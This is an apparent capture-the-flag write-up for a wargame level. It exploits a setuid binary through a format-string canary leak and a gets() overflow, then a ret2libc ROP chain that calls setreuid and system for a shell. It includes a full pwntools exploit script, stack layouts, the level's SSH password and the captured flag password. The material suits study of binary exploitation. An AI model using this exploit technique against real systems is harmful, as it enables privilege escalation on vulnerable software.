# Level 06

67aaawdq0zcaaf3x57yh6irhvyjv3vs5

## Description

```
ls -l
total 20
-rwsr-x--- 1 flag06 level06 16808 Jun  9 23:13 3jane
```

This time we don't have the source code to help us reverse engineer the program.

```
readelf -l 3jane 
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
```

Stack is not executable, so we'll need to perform a ret2libc.

## 3jane program


### gets exploit

```
nm 3jane
...
00000000004022f8 r __FRAME_END__
                 U gets@GLIBC_2.2.5
0000000000403fe8 d _GLOBAL_OFFSET_TABLE_
...
```

It seems the program is using `gets()`, let's try to find out if we can override buffer input:

```
./3jane
  [VILLA STRAYLIGHT] Access restricted.
  [3JANE] Convince me.
[3JANE] Request ID: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[3JANE] Logging: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[3JANE] Access code: [3JANE] Access denied.
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

There is indeed a buffer overflow so probably a `gets()` involved, however some kind of stack canari protection seems to be enabled.

So no simple buffer overflow. 

### Printf format test

```
[3JANE] Request ID: %6$p %7$p %8$p %9$p %10$p %11$p %12$p %13$p %14$p %15$p %16$p %17$p %18$p
[3JANE] Logging: 0x2437252070243625 0x2520702438252070 0x2430312520702439 0x2070243131252070 0x3125207024323125 0x2434312520702433 0x2070243531252070 0x25207024363125 0x400000000 0x94fce10f351c5d00 0x7fffffffed00 %
```

Let's try to find out what does this input tells us.
The 6 first value seems to correspond to ASCII string:

```
input = 0x2437252070243625.to_bytes(8, 'little')
input += 0x2520702438252070.to_bytes(8, 'little')
input += 0x2430312520702439.to_bytes(8, 'little')
input += 0x2070243131252070.to_bytes(8, 'little')
input += 0x3125207024323125.to_bytes(8, 'little')
input += 0x2434312520702433.to_bytes(8, 'little')
input += 0x2070243531252070.to_bytes(8, 'little')
input += 0x25207024363125.to_bytes(8, 'little')

print(input.decode('ascii'))
```
Output:

```
%6$p %7$p %8$p %9$p %10$p %11$p %12$p %13$p %14$p %15$p %16$p %
```

It actually corresponds to our format string itself.

We can also deduce the length of the buffer storing the format string, as the flags after `%16$p` are not interpreted. That is 64 bytes, because the stored content has 63 length (64 minus 1 for the terminating null byte).

That's an issue because if we wan't to replicate the `ex04` exploit, we'll need at least `72` bytes of payload to write, not couting the flag format needed for the write operation.

That means we'll have to write to the other buffer.

In the mean time, let's analyse the remaining values:
```
0x400000000 => local int ?
0x94fce10f351c5d00 => stack canary (random values)
0x7fffffffed00 => saved rbp value (address of previous frame start, main ??).
```

And let's print the stack values above this:

```
[3JANE] Request ID: %17$p %18$p %19$p %20$p %21$p %22$p
[3JANE] Logging: 0x401686 0x7fffffffede0 0x80e1ad3200d0a000 0x7fffffffeda0 0x7ffff7c2a1ca 0x7fffffffed50
```

We can use nm to resolve address:

```
0x401686 => main return address
0x7fffffffede0 => local ?
0x80e1ad3200d0a000 => stack canary (random value)
0x7fffffffeda0 => saved rbp (_start frame)
0x7ffff7c2a1ca => _start return address 
0x7fffffffed50 => local ?
```

From all this we can reconstitute the layout of the frame at the time of the printf call, by `func` (anonymous for now) :

| Stack address    | printf()'s $rbp offset | Value | Description
| -------- | ------- | ------- | --- |
| 0x7fffffffed00 | +0x80 | 0x7fffffffeda0 | main saved rbp (_start $rbp) 
| ? | +0x78 | 0x80e1ad3200d0a000 | stack canary
| ? | +0x70 | 0x7fffffffede0 | local ?
| ? | +0x68 | 0x401686 | main return address
| ? | +0x60 | 0x7fffffffed00 | func saved rbp (main $rbp)
| ? | +0x58 | 0x94fce10f351c5d00 | stack canary
| ? | +0x50 | 0x400000000 | local int
| ? | +0x10 | "%6$p ..." | format string content 
| ? | +0x08 | ? | func return
| ? | $rbp | ? | printf saved rbp (func $rbp)

From `0x7fffffffed00`, we can then deduce all successive addresses :


| Stack address    | printf()'s $rbp offset | Value | Description
| -------- | ------- | ------- | --- |
| 0x7fffffffed00 | +0x80 | 0x7fffffffeda0 | main saved rbp (_start $rbp) 
| 0x7fffffffecf8 | +0x78 | 0x80e1ad3200d0a000 | stack canary
| 0x7fffffffecf0 | +0x70 | 0x7fffffffede0 | local ?
| 0x7fffffffece8 | +0x68 | 0x401686 | main return address
| 0x7fffffffece0 | +0x60 | 0x7fffffffed00 | func saved rbp (main $rbp)
| 0x7fffffffecd8 | +0x58 | 0x94fce10f351c5d00 | stack canary
| 0x7fffffffecd0 | +0x50 | 0x400000000 | local int
| 0x7fffffffec90 | +0x10 | "%6$p ..." | format string content
| 0x7fffffffec88 | +0x08 | ? | func return
| 0x7fffffffec80 | $rbp | 0x7fffffffece0 | printf saved rbp (func $rbp)

### gdb analysis

It seems we have reach what we can explain without using gdb.

So let's use it.

Disassembly tells us a few things :
- the format string input + printf() is done in the function `log_request()`. This input is indeed protected by a `fgets()` read, with no possible overflow
- the second read occurs in the function `authenticate()`, using `gets()`. However stack overflow are prevented by a `__stack_chk_fail()` call before each function return.

Let's check how these stack canary features actually work :

```
(gdb) disas main
   0x000000000040165c <+0>:	endbr64
   0x0000000000401660 <+4>:	push   %rbp
   0x0000000000401661 <+5>:	mov    %rsp,%rbp
   0x0000000000401664 <+8>:	sub    $0x10,%rsp
   0x0000000000401668 <+12>:	mov    %fs:0x28,%rax
   0x0000000000401671 <+21>:	mov    %rax,-0x8(%rbp)
   0x0000000000401675 <+25>:	xor    %eax,%eax
   0x0000000000401677 <+27>:	call   0x401276 <init_vault>
   0x000000000040167c <+32>:	call   0x4013a0 <print_banner>
   0x0000000000401681 <+37>:	call   0x401418 <log_request>
   0x0000000000401686 <+42>:	call   0x4014de <authenticate>
   0x000000000040168b <+47>:	call   0x401594 <display_vault>
   0x0000000000401690 <+52>:	mov    $0x0,%eax
   0x0000000000401695 <+57>:	mov    -0x8(%rbp),%rdx
   0x0000000000401699 <+61>:	sub    %fs:0x28,%rdx
   0x00000000004016a2 <+70>:	je     0x4016a9 <main+77>
   0x00000000004016a4 <+72>:	call   0x401120 <__stack_chk_fail@plt>
   0x00000000004016a9 <+77>:	leave
   0x00000000004016aa <+78>:	ret
```

The idea is actually simple :
```
// Reserver 16 byte for stack canary on the stack
0x0000000000401664 <+8>:	sub    $0x10,%rsp
// Read the value in the fs segment (local thread storage)
0x0000000000401668 <+12>:	mov    %fs:0x28,%rax
// Write this value locally on the stack
0x0000000000401671 <+21>:	mov    %rax,-0x8(%rbp)
...
// Rest of function
...
// Zeroed rax
0x0000000000401690 <+52>:	mov    $0x0,%eax
// Retrieve the saved value on the stack
0x0000000000401695 <+57>:	mov    -0x8(%rbp),%rdx
// Substract the original value from the fs segment
0x0000000000401699 <+61>:	sub    %fs:0x28,%rdx
// If equal to rax (0), do normal func return
0x00000000004016a2 <+70>:	je     0x4016a9 <main+77>
// Else, stack has been smashed, call check_fail()
0x00000000004016a4 <+72>:	call   0x401120 <__stack_chk_fail@plt>
// Normal return
0x00000000004016a9 <+77>:	leave
0x00000000004016aa <+78>:	ret
```

The first interesting thing that tells us is :
- the stack canary is different at each run but the same for all the whole program.
- if one fuction can leak it, we can predict the value the override for all subsequent functions.
- writing the proper value in the local variable stack of a function is enough to bypass the protection.

In this case, using the format string exploit (which is occurs before the `gets()` call, we can actually print the stack canary, and then adjust the inject payload at runtime).

## The exploit

### 1. Read the stack canary from `log_request()`

As we have find out before, the `%15$p` and `%19$p` both thell us the stack canary :

```
[3JANE] Request ID: %19$p %15$p
[3JANE] Logging: 0xb2a1358ca01eb700 0xb2a1358ca01eb700
```


```
from pwn import *

context.clear(arch='amd64', os='linux')

format = b'%15$p'

shell = ssh(host='localhost', user='level06', port=4242, password='67aaawdq0zcaaf3x57yh6irhvyjv3vs5')

io = shell.process(['/home/level06/3jane'], env={})
io.sendline(format)
io.recvline() # skip first line
io.recvline()
line = io.recvline() # printf out line
hex_string = line.split()[-1].decode() 
canary = bytes.fromhex(hex_string.removeprefix('0x'))
print(canary) # b'\xb1\xa8\xc5\x0e\xe0\x05\xf6\x00'
```

### 2. Find the correct offset for the canary

Let's try different offset :
```
canary = int(hex_string, 16).to_bytes(8, byteorder='little')
offset = 0x88
# Goal is to trigger segfault instead of stack smashing call
payload = b'A' * offset + canary + b'A' * 0x200
io.sendline(payload)
io.interactive()
```

```
0x48 => stack smashing
0x58 => stack smashing
0x68 => stack smashing
0x78 => stack smashing
0x88 => segfault
```

So the correct offset is **0x88**, that means message buffer size is `0x80`.

### 3. Write the final payload

We'll reuse the ROP chain from the previous exercises :

```
RDI_GADGET_ADDR=0x7ffff7d0f84b # pop rdi; ret
RSI_GADGET_ADDR=0x7ffff7d10b3d # pop rsi; ret
SYSTEM_ADDR=0x7ffff7c58750
SETREUID_ADDR=0x7ffff7d27330
FLAG06_UID=1023
ARG_STRING_ADDR=0x7ffff7dcc42f

rop_chain = p64(RDI_GADGET_ADDR, "little")
rop_chain += p64(FLAG06_UID, "little")
rop_chain += p64(RSI_GADGET_ADDR, "little")
rop_chain += p64(FLAG06_UID, "little")
rop_chain += p64(SETREUID_ADDR, "little")
rop_chain += p64(RDI_GADGET_ADDR, "little")
rop_chain += p64(ARG_STRING_ADDR, "little")
rop_chain += p64(SYSTEM_ADDR, "little")

payload = b'A' * 0x88 + canary + 8 * b'a' + rop_chain
```

The idea is to override the return address of the `authenticate()` function with the start of the ROP chain. 

Between the canary and the return address is the saved rbp so 8 bytes of padding must be added.

### 4. Final exploit

```
python3 exploit.py
```

Output:
```
$ $ whoami
flag06
$ $ cat /home/flag06/.pass
c1t0kg9pklac7x4c7sn7iqgfppkz4usq
```